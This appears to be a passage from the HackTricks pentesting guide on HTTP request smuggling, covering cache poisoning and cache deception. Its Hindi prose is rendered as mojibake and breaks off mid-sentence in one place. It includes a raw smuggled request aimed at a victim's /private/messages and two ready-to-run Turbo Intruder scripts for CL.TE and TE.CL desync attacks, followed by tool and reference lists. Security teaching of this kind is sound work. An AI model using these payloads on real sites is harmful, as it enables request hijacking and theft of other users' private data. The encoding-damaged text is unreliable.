рдпрд╣рд╛рдВ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрд░реЛрдз рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдПрдХ рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдЖрдпрд╛рддрд┐рдд рдПрдХ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдерд╛ред рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдкрдиреЗ рдЬрд╡рд╛рдм рдореЗрдВ рдЕрдкрдирд╛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

рдпрджрд┐ рдХрд┐рд╕реА рднреА рднрд╛рдЧ рдореЗрдВ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪрд╛ рд╕рд╛рдордЧреНрд░реА рдХреИрд╢ рдХрд░рддрд╛ рд╣реИ** (рдЖрдорддреМрд░ рдкрд░ рдкреНрд░рджрд░реНрд╢рди рдХреЗ рдХрд╛рд░рдг) рддреЛ рдпрд╣ **рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрджрд▓рдХрд░ рдЙрд╕ рдХреИрд╢ рдХреЛ рджреБрд░реНрдЧрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред рд╣рдордиреЗ рдкрд╣рд▓реЗ рд╣реА рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдЕрдкреЗрдХреНрд╖рд┐рдд рд╡рд╛рдкрд╕реА рдореВрд▓реНрдп рдХреЛ 404 (рдореВрд▓ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ) рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдПрдХ рд╕рдорд╛рди рддрд░реАрдХреЗ рд╕реЗ рдЖрдк `/static/include.js` рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдкрд░ рд╕рд░реНрд╡рд░ рд╡рд╛рдкрд╕реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/index.html` рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╡рд╛рдкрд╕реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣, `/static/include.js` рдХреА рд╕рд╛рдордЧреНрд░реА `/index.html` рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдХреИрд╢ рдХреА рдЬ
### рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдЪрдЯреАрдЯреАрдкреА рдЕрдиреБрд░реЛрдз рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдФрд░ рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХреЗ рдмреАрдЪ рдХреНрдпрд╛ рдЕрдВрддрд░ рд╣реИ?**
>
> * **рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ** рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдХреИрд╢ рдореЗрдВ рдХреБрдЫ рдЦрддрд░рдирд╛рдХ рд╕рд╛рдордЧреНрд░реА рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рд╛рддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╕рд╛рдордЧреНрд░реА рдХреИрд╢ рд╕реЗ рдЕрдиреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реЗрд╡рд╛ рдХрд░рд╛рдИ рдЬрд╛рддреА рд╣реИред
> * **рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА** рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдХреИрд╢ рдореЗрдВ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рд╛рддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рд╡реИрд░рд┐рдПрдВрдЯ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдРрд╕рд╛ рдЕрдиреБрд░реЛрдз рдЪреЛрд░реА рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рд╛рдордЧреНрд░реА рд╡рд╛рдкрд╕ рдХрд░рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

рдпрджрд┐ **рдЬрд╣рд░ рдПрдХ рдРрд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ рдЬреЛ рдХреБрдЫ рд╕реНрдерд┐рд░ рд╕рд╛рдордЧреНрд░реА** рдЬреИрд╕реЗ `/someimage.png` рддрдХ рдкрд╣реБрдВрдЪ рд░рд╣рд╛ рдерд╛ рдЬреЛ **рдХреИрд╢** рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рдерд╛ред рдкреАрдбрд╝рд┐рдд рдХрд╛ `/private/messages` рдХрд╛ рд╕рд╛рдордЧреНрд░реА `/someimage.png` рдореЗрдВ рдХреИрд╢ рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдЙрдиреНрд╣реЗрдВ рдЪреБрд░рд╛ рд╕рдХреЗрдЧрд╛ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рд╣рдорд▓рд╛рд╡рд░ рдирд╣реАрдВ рдЬрд╛рдирддрд╛ рд╣реИ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдХрд┐рд╕ рд╕реНрдерд┐рд░ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣рд╛ рдерд╛** рдЗрд╕рд▓рд┐рдП рд╢рд╛рдпрдж рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рдЗрд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛ рдХрд░рдирд╛ рд╣реИ, рдХреБрдЫ рд╕реЗрдХрдВрдб рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдФрд░ рд╕рднреА рд╕реНрдерд┐рд░ рд╕рд╛рдордЧреНрд░реА рдХреЛ **рд▓реЛрдб рдХрд░реЗрдВ** рдФрд░ **рдирд┐рдЬреА рдбреЗрдЯрд╛** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВред

### рдПрдЪрдЯреАрдЯреАрдкреА рдЕрдиреБрд░реЛрдз рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХреЛ рд╢рд╕реНрддреНрд░реАрдХрд░рдг рдХрд░рдирд╛

рдХреНрдпрд╛ рдЖрдкрдиреЗ рдХреБрдЫ рдПрдЪрдЯреАрдЯреАрдкреА рдЕрдиреБрд░реЛрдз рддрдХрдиреАрдХ рдХреА рдХрдордЬреЛрд░реА рдЦреЛрдЬреА рд╣реИ рдФрд░ рдЖрдк рдЗрд╕реЗ рдХреИрд╕реЗ рд╢реЛрд╖рдг рдХрд░реЗрдВ рдЗрд╕рдХрд╛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП рдЗрди рдЕрдиреНрдп рд╢реЛрд╖рдг рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## рдЯрд░реНрдмреЛ рдЗрдВрдЯреНрд░реВрдбрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ

### рд╕реАрдПрд▓.рдЯреАрдИ

[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor) рд╕реЗ
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

рдпрд╣рд╛рдВ рд╕реЗ: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[рдпрд╣рд╛рдВ рд╕реЗ рдЫрд╡рд┐ рд▓реА рдЧрдИ рд╣реИред](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## рдЙрдкрдХрд░рдг

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): рдпрд╣ рдЙрдкрдХрд░рдг рд╡рд┐рдЪрд┐рддреНрд░ рдЕрдиреБрд░реЛрдз рдЫреЗрджрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks** рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **[ЁЯТм](https://emojipedia.org/speech-balloon/) [Discord рд╕рдореВрд╣](https://discord.gg/hRep4RUj7f) рдпрд╛ [telegram рд╕рдореВрд╣](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>
